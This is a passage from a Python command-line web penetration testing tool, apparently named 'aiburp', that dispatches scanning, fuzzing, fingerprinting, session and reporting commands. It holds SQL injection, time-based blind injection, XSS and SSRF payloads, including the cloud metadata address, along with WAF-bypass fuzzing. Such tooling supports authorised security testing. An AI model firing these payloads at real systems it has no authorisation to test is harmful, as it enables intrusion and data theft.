                print("❌ 请提供 URL 或 --targets 文件，或使用 --list 查看可用 POC")
                return
            
            all_results = []
            
            for target in targets:
                print(f"\n🎯 扫描: {target}")
                
                if args.cve:
                    # 按 CVE 扫描
                    result = manager.run_by_cve(args.cve, target)
                    if result:
                        all_results.append(result)
                        print(f"  {result}")
                    else:
                        print(f"  ❌ 未找到 CVE: {args.cve}")
                elif args.tags:
                    # 按标签扫描
                    for tag in args.tags:
                        results = manager.run_by_tag(tag, target)
                        all_results.extend(results)
                        for r in results:
                            status = "🔴" if r.vulnerable else "✅"
                            print(f"  {status} {r.name}")
                else:
                    # 全量扫描
                    results = manager.run_all(target)
                    all_results.extend(results)
                    for r in results:
                        if r.vulnerable:
                            print(f"  🔴 {r.name}: {r.evidence[:50]}...")
                        else:
                            print(f"  ✅ {r.name}")
            
            # 生成报告
            print("\n" + manager.report(all_results))
            
            # 保存报告
            if args.output:
                import json
                if args.output.endswith('.json'):
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump([r.to_dict() for r in all_results], f, indent=2, ensure_ascii=False)
                else:
                    with open(args.output, 'w', encoding='utf-8') as f:
                        f.write(manager.report(all_results))
                print(f"📄 报告已保存: {args.output}")
        
        elif args.command == "fingerprint":
            # 技术栈指纹识别 (v0.13.0 新增)
            from .fingerprint import TechDetector
            import warnings
            warnings.filterwarnings('ignore')
            
            detector = TechDetector()
            targets = []
            
            if args.targets:
                with open(args.targets, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            elif args.url:
                targets = [args.url]
            else:
                print("❌ 请提供 URL 或 --targets 文件")
                return
            
            if len(targets) == 1:
                # 单目标详细输出
                result = detector.detect(targets[0])
                print("=" * 60)
                print("🔍 技术栈指纹识别")
                print("=" * 60)
                print(f"目标: {result.url}")
                print(f"状态: {result.status_code}")
                print("")
                
                if result.error:
                    print(f"❌ 错误: {result.error}")
                elif result.technologies:
                    print("🏷️ 识别到的技术:")
                    for t in result.technologies:
                        version_str = f" {t.version}" if t.version else ""
                        print(f"  • {t.name}{version_str}")
                        print(f"    分类: {', '.join(t.categories)}")
                        print(f"    匹配: [{t.match_type}] {t.match_detail}")
                        print("")
                    
                    print("📊 分类汇总:")
                    for cat in result.category_names:
                        print(f"  - {cat}")
                else:
                    print("⚠️ 未识别到任何技术")
                
                print("=" * 60)
            else:
                # 批量扫描
                print(f"🔍 批量指纹识别: {len(targets)} 个目标")
                results = detector.batch_detect(targets, threads=args.threads)
                print(detector.report(results))
            
            # 保存报告
            if args.output:
                import json
                if len(targets) == 1:
                    data = result.to_dict()
                else:
                    data = [r.to_dict() for r in results]
                
                if args.output.endswith('.json'):
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                else:
                    with open(args.output, 'w', encoding='utf-8') as f:
                        if len(targets) == 1:
                            f.write(str(result))
                        else:
                            f.write(detector.report(results))
                print(f"📄 报告已保存: {args.output}")
        
        elif args.command == "param-discover":
            # 参数发现 (v0.13.0 新增)
            from .plugins.param_discover import ParamDiscoverer
            import warnings
            warnings.filterwarnings('ignore')
            
            discoverer = ParamDiscoverer()
            result = discoverer.discover(
                args.url, 
                depth=args.depth,
                analyze_js=not args.no_js
            )
            
            # 输出报告
            print(discoverer.report(result))
            
            # 探测隐藏参数
            if args.probe:
                print("\n🔍 探测隐藏参数...")
                hidden = discoverer.probe_hidden_params(args.url)
                if hidden:
                    print(f"✅ 发现隐藏参数: {', '.join(hidden)}")
                else:
                    print("❌ 未发现隐藏参数")
            
            # 保存报告
            if args.output:
                import json
                if args.output.endswith('.json'):
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump(result.to_dict(), f, indent=2, ensure_ascii=False)
                else:
                    with open(args.output, 'w', encoding='utf-8') as f:
                        f.write(discoverer.report(result))
                print(f"📄 报告已保存: {args.output}")
        
        elif args.command == "subdomain":
            # 子域名收集 (v0.13.0 新增)
            from .plugins.subdomain import SubdomainEnum
            import warnings
            warnings.filterwarnings('ignore')
            
            collector = SubdomainEnum(args.domain, max_workers=args.threads)
            
            # 检测通配符
            wildcard = collector.detect_wildcard()
            if wildcard.has_wildcard:
                print(f"⚠️ 检测到 DNS 通配符: {wildcard.wildcard_ip}")
            
            # 枚举子域名
            result = collector.enumerate()
            
            # 验证存活
            if args.verify:
                print("🔍 验证存活状态...")
                # 已在 enumerate 中完成 HTTP 检查
            
            print(result)
            
            # 保存报告
            if args.output:
                import json
                if args.output.endswith('.json'):
                    with open(args.output, 'w', encoding='utf-8') as f:
                        f.write(result.to_json())
                else:
                    # 纯文本列表
                    with open(args.output, 'w', encoding='utf-8') as f:
                        for r in result.alive_domains:
                            f.write(f"{r.domain}\n")
                print(f"📄 报告已保存: {args.output}")
        
        elif args.command == "dork":
            # 搜索引擎 Dork (v0.13.0 新增)
            from .plugins.dork import DorkSearcher
            import warnings
            warnings.filterwarnings('ignore')
            
            searcher = DorkSearcher()
            
            if args.engine == "google":
                # 生成 Google Dorks
                dorks = searcher.generate_google_dorks(args.query, category=args.category)
                print("=" * 60)
                print("🔍 Google Dorks")
                print("=" * 60)
                print(f"目标: {args.query}")
                if args.category:
                    print(f"分类: {args.category}")
                print("")
                print("📋 Dork 列表 (复制到 Google 搜索):")
                for dork in dorks:
                    print(f"  {dork}")
                print("")
                print("=" * 60)
                
                if args.output:
                    with open(args.output, 'w', encoding='utf-8') as f:
                        for dork in dorks:
                            f.write(f"{dork}\n")
                    print(f"📄 已保存: {args.output}")
            
            elif args.engine == "shodan":
                result = searcher.shodan_search(args.query, limit=args.limit)
                print(searcher.report(result))
                
                if args.output:
                    import json
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump(result.to_dict(), f, indent=2, ensure_ascii=False)
                    print(f"📄 已保存: {args.output}")
            
            elif args.engine == "fofa":
                result = searcher.fofa_search(args.query, limit=args.limit)
                print(searcher.report(result))
                
                if args.output:
                    import json
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump(result.to_dict(), f, indent=2, ensure_ascii=False)
                    print(f"📄 已保存: {args.output}")
        
        elif args.command == "ffuzz":
            # 高性能异步 Fuzzer (v0.13.0 新增)
            from .plugins.fuzzer import AsyncFuzzer, FuzzConfig, _get_wordlist_path
            import warnings
            warnings.filterwarnings('ignore')
            
            # 构建配置
            config = FuzzConfig(
                method=args.method,
                concurrency=args.concurrency,
                rate_limit=args.rate,
                timeout=args.timeout,
                follow_redirects=args.follow,
                auto_calibrate=not args.no_calibrate,
            )
            
            # 解析 headers
            if args.header:
                for h in args.header:
                    if ':' in h:
                        k, v = h.split(':', 1)
                        config.headers[k.strip()] = v.strip()
            
            # POST 数据
            if args.data:
                config.data = args.data
            
            # 匹配状态码
            if args.match_status:
                config.match_status = [int(s) for s in args.match_status.split(',')]
            
            # 过滤器
            if args.filter_status:
                config.filter_status = [int(s) for s in args.filter_status.split(',')]
            if args.filter_size is not None:
                config.filter_size = args.filter_size
            if args.filter_words is not None:
                config.filter_words = args.filter_words
            if args.filter_lines is not None:
                config.filter_lines = args.filter_lines
            
            # 加载字典
            try:
                wordlist_path = _get_wordlist_path(args.wordlist)
            except FileNotFoundError as e:
                print(f"❌ {e}")
                return
            
            print(f"⚡ 高性能 Fuzz")
            print(f"🎯 目标: {args.url}")
            print(f"📚 字典: {args.wordlist}")
            print(f"🔧 并发: {args.concurrency}, 超时: {args.timeout}s")
            if args.rate:
                print(f"⏱️ 速率限制: {args.rate} req/s")
            print("")
            
            fuzzer = AsyncFuzzer(config)
            results = fuzzer.run(args.url, wordlist_path)
            
            print(fuzzer.report())
            
            # 保存结果
            if args.output:
                import json
                if args.output.endswith('.json'):
                    with open(args.output, 'w', encoding='utf-8') as f:
                        json.dump([{
                            "input": r.input,
                            "url": r.url,
                            "status": r.status,
                            "size": r.size,
                            "words": r.words,
                            "lines": r.lines,
                            "time": r.time
                        } for r in results], f, indent=2)
                else:
                    with open(args.output, 'w', encoding='utf-8') as f:
                        for r in results:
                            f.write(f"{r.url}\n")
                print(f"📄 已保存: {args.output}")
        
        elif args.command == "portscan":
            # 端口扫描与服务识别 (v0.14.0 新增)
            from .portscan import PortScanner, NetworkScanner, report as ps_report
            import warnings
            warnings.filterwarnings('ignore')
            
            print("=" * 60)
            print("🔍 端口扫描与服务识别")
            print("=" * 60)
            print(f"目标: {args.target}")
            print(f"端口: {args.ports}")
            print(f"并发: {args.concurrency}, 超时: {args.timeout}s")
            if args.deep:
                print("模式: 深度 (nmap)")
            print("")
            
            # 判断是否为 CIDR
            if "/" in args.target:
                scanner = NetworkScanner(timeout=args.timeout, concurrency=args.concurrency)
                results = scanner.scan_range(args.target, ports=args.ports)
                print(ps_report(results))
                
                # 保存结果
                if args.output:
                    import json
                    if args.output.endswith('.json'):
                        data = []
                        for r in results:
                            for p in r.open_ports:
                                data.append({
                                    "host": r.host,
                                    "port": p.port,
                                    "service": p.service,
                                    "version": p.version,
                                    "banner": p.banner[:100] if p.banner else ""
                                })
                        with open(args.output, 'w', encoding='utf-8') as f:
                            json.dump(data, f, indent=2, ensure_ascii=False)
                    else:
                        with open(args.output, 'w', encoding='utf-8') as f:
                            for r in results:
                                for p in r.open_ports:
                                    f.write(f"{r.host}:{p.port}\t{p.service}\n")
                    print(f"📄 已保存: {args.output}")
            else:
                scanner = PortScanner(timeout=args.timeout, concurrency=args.concurrency)
                result = scanner.scan(args.target, ports=args.ports)
                
                print(f"扫描耗时: {result.scan_time:.2f}s")
                print(f"开放端口: {len(result.open_ports)}")
                print("")
                
                if result.open_ports:
                    print("📋 开放端口:")
                    for p in result.open_ports:
                        ver = f" ({p.version})" if p.version else ""
                        print(f"  {p.port}/tcp - {p.service or 'unknown'}{ver}")
                else:
                    print("未发现开放端口")
                
                # 保存结果
                if args.output:
                    import json
                    if args.output.endswith('.json'):
                        data = [{
                            "host": result.host,
                            "port": p.port,
                            "service": p.service,
                            "version": p.version,
                            "banner": p.banner[:100] if p.banner else ""
                        } for p in result.open_ports]
                        with open(args.output, 'w', encoding='utf-8') as f:
                            json.dump(data, f, indent=2, ensure_ascii=False)
                    else:
                        with open(args.output, 'w', encoding='utf-8') as f:
                            for p in result.open_ports:
                                f.write(f"{result.host}:{p.port}\t{p.service}\n")
                    print(f"\n📄 已保存: {args.output}")
        
        elif args.command == "auto-scan":
            # 自动扫描 (支持批量)
            targets = []
            
            if args.targets:
                # 从文件读取目标
                with open(args.targets, 'r') as f:
                    targets = [line.strip() for line in f if line.strip()]
            elif args.url:
                targets = [args.url]
            else:
                print("❌ 请提供 URL 或 --targets 文件")
                return
            
            reporter = Reporter(project=args.project) if args.output else None
            
            for target in targets:
                print(f"\n🎯 扫描: {target}")
                if reporter:
                    reporter.add_target(target)
                
                scanner = AutoScanner(burp)
                report = scanner.scan(
                    target,
                    depth=args.depth,
                    types=args.types,
                    test_headers=not args.no_headers,
                    test_cookies=not args.no_cookies
                )
                print(report)
                
                # 添加到报告
                if reporter and hasattr(scanner, 'findings'):
                    for f in scanner.findings:
                        f['target'] = target
                        reporter.add_finding(f)
            
            # 保存报告
            if reporter and args.output:
                reporter.save(args.output)
                print(f"\n📄 报告已保存: {args.output}")
        
        elif args.command == "xss-scan":
            # XSS 检测 (v0.11.0 新增)
            method = "POST" if args.post else "GET"
            scanner = XSSScanner(burp)
            scanner.scan(args.url, args.param, args.value, method=method, deep=args.deep)
            result = scanner.report()
            print(result)
            
            if args.output:
                reporter = Reporter(project=args.project)
                reporter.add_target(args.url)
                for f in scanner.findings:
                    f['target'] = args.url
                    f['severity'] = 'high' if 'script' in f.get('type', '') else 'medium'
                    reporter.add_finding(f)
                reporter.save(args.output)
                print(f"\n📄 报告已保存: {args.output}")
        
        elif args.command == "leak-scan":
            # 源码泄露检测 (v0.11.0 新增)
            scanner = LeakScanner(burp, threads=args.threads)
            scanner.scan(args.url, scan_types=args.types)
            result = scanner.report()
            print(result)
            
            if args.output:
                reporter = Reporter(project=args.project)
                reporter.add_target(args.url)
                for f in scanner.findings:
                    f['target'] = args.url
                    # 设置严重程度
                    leak_type = f.get('type', '')
                    if leak_type in ['git', 'svn', 'env', 'web_config', 'sql_dump', 'mdb']:
                        f['severity'] = 'critical'
                    elif leak_type in ['source_asp', 'source_php', 'backup_asp', 'backup_php', 'archive']:
                        f['severity'] = 'high'
                    elif leak_type in ['htaccess', 'phpinfo', 'log']:
                        f['severity'] = 'medium'
                    else:
                        f['severity'] = 'low'
                    reporter.add_finding(f)
                reporter.save(args.output)
                print(f"\n📄 报告已保存: {args.output}")
        
        elif args.command == "discover":
            # 自动发现 - 重定向到 param-discover
            print("⚠️ discover 已废弃，请使用: aiburp param-discover <url>")
            print("")
            
            from .plugins.param_discover import ParamDiscoverer
            discoverer = ParamDiscoverer()
            result = discoverer.discover(args.url, depth=args.depth)
            print(discoverer.report(result))
        
        elif args.command == "api-json":
            # JSON API 测试 (新增)
            result = test_api_json(
                burp, args.url, args.body, args.param,
                method=args.method,
                headers=args.headers,
                types=args.types
            )
            print(result)
        
        elif args.command == "api-rest":
            # REST API 路径参数测试 (新增)
            result = test_api_rest(
                burp, args.url,
                method=args.method,
                headers=args.headers,
                types=args.types
            )
            print(result)
        
        elif args.command == "api-graphql":
            # GraphQL 测试 (新增)
            result = test_api_graphql(
                burp, args.url, args.query,
                variables=args.variables,
                headers=args.headers
            )
            print(result)
        
        elif args.command == "probe":
            method = "POST" if args.post else "GET"
            
            if args.smart:
                smart = SmartBurp(project=args.project, delay=args.delay)
                decision = smart.smart_scan(args.url, args.param, args.value)
                print(decision)
                smart.close()
            else:
                # 简单探测模式
                print(f"🔍 探测: {args.url}")
                print(f"   参数: {args.param}={args.value}")
                print(f"   方法: {method}")
                print("")
                
                # 基线请求
                if method == "GET":
                    baseline = burp.get(f"{args.url}?{args.param}={args.value}")
                else:
                    baseline = burp.post(args.url, data={args.param: args.value})
                
                print(f"📊 基线响应:")
                print(f"   状态: {baseline.status}")
                print(f"   大小: {baseline.length}b")
                print(f"   时间: {baseline.time_ms:.0f}ms")
                
                # 测试常见 payload
                test_payloads = ["'", '"', "' OR '1'='1", "1 AND 1=1", "1 AND 1=2"]
                print(f"\n🧪 测试 {len(test_payloads)} 个 payload...")
                
                for p in test_payloads:
                    test_value = f"{args.value}{p}"
                    if method == "GET":
                        r = burp.get(f"{args.url}?{args.param}={test_value}")
                    else:
                        r = burp.post(args.url, data={args.param: test_value})
                    
                    diff = abs(r.length - baseline.length)
                    status_icon = "⚠️" if r.status != baseline.status or diff > 50 else "✅"
                    print(f"   {status_icon} {p[:20]:20} -> {r.status} {r.length}b ({diff:+d})")
        
        elif args.command == "scan":
            # 使用异步扫描器
            from .burp import AsyncBurp
            from .detectors import AsyncVulnScanner
            import asyncio
            
            async def do_scan():
                async with AsyncBurp(project=args.project, delay=args.delay) as async_burp:
                    scanner = AsyncVulnScanner(async_burp)
                    return await scanner.scan(args.url, args.param, args.value, args.types)
            
            findings = asyncio.run(do_scan())
            
            # 打印报告
            print("=" * 60)
            print(f"🔍 漏洞扫描报告")
            print("=" * 60)
            print(f"目标: {args.url}")
            print(f"参数: {args.param}={args.value}")
            print(f"类型: {args.types or 'all'}")
            print("")
            
            if findings:
                for f in findings:
                    icon = {"high": "🔴", "medium": "🟡", "low": "🟢"}.get(f.confidence, "⚪")
                    print(f"{icon} [{f.confidence.upper()}] {f.vuln_type}")
                    print(f"   证据: {f.evidence}")
                    print(f"   Payload: {f.payload}")
                    print("")
            else:
                print("✅ 未发现漏洞")
            print("=" * 60)
            
        elif args.command == "fuzz":
            payload_map = {
                "sqli": SQLI.quick if args.quick else SQLI.detection,
                "sqli_time": SQLI.time_based,
                "sqli_error": SQLI.error_based,
                "sqli_auth": SQLI.auth_bypass,
                "sqli_bypass": SQLI.waf_bypass,
                "xss": XSS.quick if args.quick else XSS.basic,
                "lfi": LFI.quick if args.quick else LFI.linux,
                "ssrf": SSRF.quick if args.quick else SSRF.internal,
                "cmdi": CMDi.quick if args.quick else CMDi.linux,
                "ssti": SSTI.quick if args.quick else SSTI.detection,
            }
            payloads = payload_map.get(args.payloads, SQLI.detection)
            results = burp.fuzz(args.url, payloads)
            print(fuzz_report(results))
            
        elif args.command == "request":
            # 加载会话 (v0.18.0 新增)
            if hasattr(args, 'session') and args.session:
                from .session import SessionManager
                sm = SessionManager(args.project)
                session = sm.load(args.session)
                if session:
                    burp.set_session(session)
                else:
                    print(f"⚠️ 会话不存在: {args.session}")
            
            if args.method.upper() == "POST":
                r = burp.post(args.url, data=args.data)
            else:
                r = burp.get(args.url)
            print(r)
            print(f"\nBody ({r.length} bytes):")
            print(r.body[:500] + "..." if len(r.body) > 500 else r.body)
        
        elif args.command == "confirm-blind":
            result = confirm_time_blind(
                burp, args.url, args.param, args.value,
                sleep_sec=args.sleep, times=args.times, threshold=args.threshold
            )
            print(result)
        
        elif args.command == "header":
            headers_list = [h.strip() for h in args.headers.split(",")]
            result = test_header_injection(
                burp, args.url, headers_list,
                cookie=args.cookie, types=args.types
            )
            print(result)
        
        elif args.command == "idor":
            result = test_idor(
                burp, args.url,
                range_str=args.range,
                wordlist=args.wordlist,
                diff_threshold=args.diff,
                test_ssrf=args.ssrf
            )
            print(result)
        
        elif args.command == "post-form":
            result = test_post_form(
                burp, args.url, args.params, args.data,
                types=args.types
            )
            print(result)
        
        elif args.command == "auth":
            # 认证会话管理 (v0.18.0 新增)
            from .session import SessionManager
            
            sm = SessionManager(args.project)
            
            if args.auth_action == "login":
                # 自动登录
                session = sm.login(
                    login_url=args.url,
                    username=args.username,
                    password=args.password,
                    save_as=args.save,
                    username_field=args.user_field,
                    password_field=args.pass_field,
                    check_url=args.check_url,
                    success_indicator=args.success,
                    failure_indicator=args.failure
                )
                if session:
                    print(f"\n🎉 会话已保存: {args.save}")
                    print(f"   Cookie: {len(session.cookies)} 个")
                else:
                    print("\n❌ 登录失败")
            
            elif args.auth_action == "import-cookie":
                # 导入 Cookie
                session = sm.import_cookie(args.cookie, args.save)
                print(f"\n使用方法:")
                print(f"  aiburp request GET https://target.com/api --session {args.save}")
            
            elif args.auth_action == "import-token":
                # 导入 Token
                session = sm.import_token(args.token, args.save, args.type)
                print(f"\n使用方法:")
                print(f"  aiburp request GET https://target.com/api --session {args.save}")
            
            elif args.auth_action == "import-burp":
                # 从 Burp 导入
                session = sm.import_from_burp(args.file, args.save)
                if session:
                    print(f"\n使用方法:")
                    print(f"  aiburp request GET https://target.com/api --session {args.save}")
            
            elif args.auth_action == "list":
                # 列出会话
                sessions = sm.list_sessions()
                print("=" * 60)
                print(f"📋 保存的会话 ({len(sessions)} 个)")
                print("=" * 60)
                if sessions:
                    for s in sessions:
                        valid_icon = "✅" if s.valid else "❌"
                        print(f"  {valid_icon} {s.name}")
                        print(f"     Cookie: {len(s.cookies)} 个, Token: {'有' if s.token else '无'}")
                        print(f"     创建: {s.created_at[:19]}")
                        if s.notes:
                            print(f"     备注: {s.notes}")
                        print()
                else:
                    print("  (无保存的会话)")
                print("=" * 60)
            
            elif args.auth_action == "show":
                # 显示会话详情
                session = sm.load(args.name)
                if session:
                    print("=" * 60)
                    print(f"📋 会话详情: {session.name}")
                    print("=" * 60)
                    print(f"状态: {'✅ 有效' if session.valid else '❌ 无效'}")
                    print(f"创建时间: {session.created_at}")
                    print(f"更新时间: {session.updated_at}")
                    print(f"登录 URL: {session.login_url or '(无)'}")
                    print(f"验证 URL: {session.check_url or '(无)'}")
                    print(f"备注: {session.notes or '(无)'}")
                    print()
                    print("🍪 Cookie:")
                    for k, v in session.cookies.items():
                        # 脱敏显示
                        v_display = v[:20] + "..." if len(v) > 20 else v
                        print(f"  {k} = {v_display}")
                    if session.token:
                        print()
                        print(f"🔑 Token ({session.token_type}):")
                        print(f"  {session.token[:30]}...")
                    print("=" * 60)
            
            elif args.auth_action == "delete":
                # 删除会话
                if sm.delete(args.name):
                    print(f"✅ 已删除会话: {args.name}")
                else:
                    print(f"❌ 会话不存在: {args.name}")
            
            elif args.auth_action == "check":
                # 检查会话有效性
                session = sm.load(args.name)
                if session:
                    url = args.url or session.check_url
                    if url:
                        print(f"🔍 检查会话有效性: {args.name}")
                        print(f"   验证 URL: {url}")
                        if sm.check_validity(session, url):
                            print("✅ 会话有效")
                            sm.save(session)  # 更新状态
                        else:
                            print("❌ 会话已失效")
                            sm.save(session)
                    else:
                        print("⚠️ 请指定 --url 参数")
            
            elif args.auth_action == "export":
                # 导出会话
                result = sm.export(args.name, args.format)
                if result:
                    print(f"📤 导出格式: {args.format}")
                    print("-" * 40)
                    print(result)
                    print("-" * 40)
                else:
                    print(f"❌ 会话不存在: {args.name}")
            
            else:
                # 未指定子命令
                print("用法: aiburp auth <action>")
                print()
                print("可用操作:")
                print("  login         自动登录并保存会话")
                print("  import-cookie 从 Cookie 字符串导入")
                print("  import-token  导入 Bearer/Basic Token")
                print("  import-burp   从 Burp Suite 导出文件导入")
                print("  list          列出所有保存的会话")
                print("  show          显示会话详情")
                print("  delete        删除会话")
                print("  check         检查会话有效性")
                print("  export        导出会话")
                print()
                print("示例:")
                print("  aiburp auth login https://target.com/login -u admin -p pass123 --save admin")
                print("  aiburp auth import-cookie 'PHPSESSID=xxx' --save session1")
                print("  aiburp auth list")
        
        elif args.command == "report":
            # 报告生成 (v0.18.0 新增)
            from .plugins.report_generator import ReportGenerator, Finding, Severity
            
            if args.report_action == "generate":
                rg = ReportGenerator(args.project)
                
                # 设置元数据
                if args.title:
                    rg.meta.title = args.title
                if args.target:
                    rg.meta.target = args.target
                
                # 加载漏洞发现
                if args.findings:
                    count = rg.load_findings(args.findings)
                    print(f"📄 加载 {count} 个漏洞发现")
                
                # 生成报告
                if args.format == "html":
                    rg.generate_html(args.output)
                elif args.format == "md":
                    rg.generate_md(args.output)
                elif args.format == "json":
                    rg.generate_json(args.output)
                
                rg.print_summary()
                print(f"\n✅ 报告已生成: {args.output}")
            
            else:
                print("用法: aiburp report generate --format html -o report.html")
                print()
                print("可用操作:")
                print("  generate  生成报告")
                print()
                print("参数:")
                print("  --format, -f  报告格式 (html/md/json)")
                print("  --output, -o  输出文件路径")
                print("  --title, -t   报告标题")
                print("  --target      目标 URL")
                print("  --findings    漏洞发现 JSON 文件")
        
        elif args.command == "waf-detect":
            # WAF 检测 (v0.18.0 新增)
            from .plugins.smart_payload import SmartPayloadGenerator
            
            print("=" * 50)
            print("🛡️ WAF 检测")
            print("=" * 50)
            print(f"目标: {args.url}")
            print()
            
            spg = SmartPayloadGenerator(burp)
            result = spg.detect_waf(args.url)
            
            print(f"结果: {result}")
            
            if result.detected:
                print(f"\n📋 检测证据:")
                for evidence in result.evidence[:10]:
                    print(f"  - {evidence}")
                
                print(f"\n💡 建议: 使用 smart-fuzz 命令进行 WAF 绕过测试")
                print(f"   aiburp smart-fuzz {args.url} <param> <value>")
            
            print("=" * 50)
        
        elif args.command == "smart-fuzz":
            # 智能 Fuzz (v0.18.0 新增)
            from .plugins.smart_payload import SmartPayloadGenerator
            
            print("=" * 50)
            print("🎯 智能 Fuzz (WAF 绕过)")
            print("=" * 50)
            print(f"目标: {args.url}")
            print(f"参数: {args.param}")
            print(f"类型: {args.type}")
            print()
            
            spg = SmartPayloadGenerator(burp)
            results = spg.adaptive_fuzz(
                args.url,
                args.param,
                args.value,
                vuln_type=args.type,
                max_payloads=args.max
            )
            
            # 统计
            interesting = [r for r in results if r.get("interesting")]
            blocked = [r for r in results if r.get("blocked")]
            
            if interesting:
                print(f"\n🔴 有趣的响应 ({len(interesting)} 个):")
                for r in interesting[:10]:
                    print(f"  - {r['payload'][:50]}... → {r.get('note', '')}")
            
            print("=" * 50)
        
        elif args.command == "targets":
            # 批量目标管理 (v0.18.0 新增)
            from .plugins.target_manager import TargetManager
            
            tm = TargetManager(args.project, burp)
            
            if args.targets_action == "import":
                # 导入目标
                tm.import_urls(args.file)
            
            elif args.targets_action == "add":
                # 添加单个目标
                tm.add_url(args.url)
                print(f"✅ 已添加: {args.url}")
            
            elif args.targets_action == "list":
                # 列出目标
                targets = tm.list_targets()
                
                # 按状态筛选
                if hasattr(args, 'status') and args.status:
                    from .plugins.target_manager import TargetStatus
                    targets = [t for t in targets if t.status == TargetStatus(args.status)]
                
                print("=" * 60)
                print(f"📋 目标列表 ({len(targets)} 个)")
                print("=" * 60)
                
                status_icons = {
                    "new": "🆕",
                    "alive": "✅",
                    "dead": "❌",
                    "scanned": "🔍",
                    "vulnerable": "🔴"
                }
                
                for t in targets[:50]:  # 最多显示 50 个
                    icon = status_icons.get(t.status.value, "?")
                    tech_str = f" [{', '.join(t.technologies[:2])}]" if t.technologies else ""
                    vuln_str = f" 🔴{len(t.vulnerabilities)}" if t.vulnerabilities else ""
                    print(f"  {icon} {t.url}{tech_str}{vuln_str}")
                
                if len(targets) > 50:
                    print(f"  ... 还有 {len(targets) - 50} 个")
                
                print("=" * 60)
                tm.print_summary()
            
            elif args.targets_action == "check":
                # 检查存活
                tm.check_alive(threads=args.threads)
            
            elif args.targets_action == "fingerprint":
                # 指纹识别
                tm.fingerprint_all(threads=args.threads)
            
            elif args.targets_action == "scan":
                # 漏洞扫描
                tm.scan_all(types=args.types, threads=args.threads)
            
            elif args.targets_action == "export":
                # 导出
                tm.export(args.output, format=args.format)
            
            elif args.targets_action == "clear":
                # 清空
                confirm = input("⚠️ 确定要清空所有目标吗? (y/N): ")
                if confirm.lower() == 'y':
                    tm.clear()
                    print("✅ 已清空所有目标")
                else:
                    print("❌ 已取消")
            
            else:
                # 未指定子命令
                print("用法: aiburp targets <action>")
                print()
                print("可用操作:")
                print("  import       导入目标列表")
                print("  add          添加单个目标")
                print("  list         列出所有目标")
                print("  check        检查目标存活状态")
                print("  fingerprint  批量指纹识别")
                print("  scan         批量漏洞扫描")
                print("  export       导出结果")
                print("  clear        清空所有目标")
                print()
                print("示例:")
                print("  aiburp targets import urls.txt")
                print("  aiburp targets check --threads 10")
                print("  aiburp targets scan --types sqli xss")
                print("  aiburp targets export -o results.json")
            
    finally:
        burp.close()


def confirm_time_blind(burp, url, param, value, sleep_sec=3, times=3, threshold=0.8):
    """
    时间盲注确认 - 多次测试排除网络波动
    
    Args:
        sleep_sec: SLEEP 秒数
        times: 测试次数
        threshold: 延迟阈值比例 (0.8 = 80% 的预期延迟)
    """
    lines = ["=" * 50, "🕐 时间盲注确认测试", "=" * 50, ""]
    
    # 1. 获取基线时间 (多次取平均)
    baseline_times = []
    for i in range(3):
        r = burp._send_param(url, param, value, "GET")
        baseline_times.append(r.time_ms)
        time.sleep(burp.delay)
    
    baseline_avg = sum(baseline_times) / len(baseline_times)
    baseline_max = max(baseline_times)
    lines.append(f"📊 基线时间: 平均 {baseline_avg:.0f}ms, 最大 {baseline_max:.0f}ms")
    lines.append("")
    
    # 2. 测试 payload
    payloads = [
        (f"{value}' AND SLEEP({sleep_sec})--", "MySQL (单引号)"),
        (f"{value}\" AND SLEEP({sleep_sec})--", "MySQL (双引号)"),
        (f"{value} AND SLEEP({sleep_sec})", "MySQL (无引号)"),
        (f"{value}'; WAITFOR DELAY '0:0:{sleep_sec}'--", "MSSQL (单引号)"),
        (f"{value}' AND pg_sleep({sleep_sec})--", "PostgreSQL"),
        (f"{value}' || DBMS_LOCK.SLEEP({sleep_sec})--", "Oracle"),
    ]
    
    expected_delay = sleep_sec * 1000  # 转为毫秒
    min_delay = expected_delay * threshold  # 最小延迟阈值
    
    confirmed = []
    
    for payload, db_type in payloads:
        lines.append(f"🔍 测试: {db_type}")
        lines.append(f"   Payload: {payload[:60]}...")
        
        delays = []
        success_count = 0
        
        for i in range(times):
            r = burp._send_param(url, param, payload, "GET")
            actual_delay = r.time_ms - baseline_avg
            delays.append(actual_delay)
            
            if actual_delay >= min_delay:
                success_count += 1
                lines.append(f"   [{i+1}/{times}] ✅ {r.time_ms:.0f}ms (延迟 +{actual_delay:.0f}ms)")
            else:
                lines.append(f"   [{i+1}/{times}] ❌ {r.time_ms:.0f}ms (延迟 +{actual_delay:.0f}ms)")
            
            time.sleep(burp.delay)
        
        # 判断是否确认
        if success_count >= times * 0.7:  # 70% 成功率
            avg_delay = sum(delays) / len(delays)
            confirmed.append({
                "db_type": db_type,
                "payload": payload,
                "avg_delay": avg_delay,
                "success_rate": success_count / times
            })
            lines.append(f"   ✅ 确认! 平均延迟 {avg_delay:.0f}ms, 成功率 {success_count}/{times}")
        else:
            lines.append(f"   ❌ 未确认 (成功率 {success_count}/{times})")
        
        lines.append("")
    
    # 3. 总结
    lines.append("=" * 50)
    if confirmed:
        lines.append("🎯 确认结果: SQL 注入漏洞存在!")
        lines.append("")
        for c in confirmed:
            lines.append(f"  数据库: {c['db_type']}")
            lines.append(f"  Payload: {c['payload']}")
            lines.append(f"  平均延迟: {c['avg_delay']:.0f}ms")
            lines.append(f"  成功率: {c['success_rate']*100:.0f}%")
            lines.append("")
    else:
        lines.append("❌ 未确认时间盲注漏洞")
        lines.append("💡 建议: 尝试其他注入方式或检查 WAF")
    lines.append("=" * 50)
    
    return "\n".join(lines)


def test_header_injection(burp, url, headers, cookie=None, types=None):
    """
    HTTP 头注入测试
    
    测试 X-Forwarded-For, Host, Referer 等头的注入
    """
    if types is None:
        types = ["sqli"]
    
    lines = ["=" * 50, "🔧 HTTP 头注入测试", "=" * 50, ""]
    
    # 基线
    baseline = burp.get(url)
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b {baseline.time_ms:.0f}ms")
    lines.append("")
    
    # Payload 映射
    sqli_payloads = ["'", "' OR '1'='1", "1' AND SLEEP(3)--", "\" OR \"1\"=\"1"]
    xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
    ssrf_payloads = ["http://127.0.0.1", "http://169.254.169.254/"]
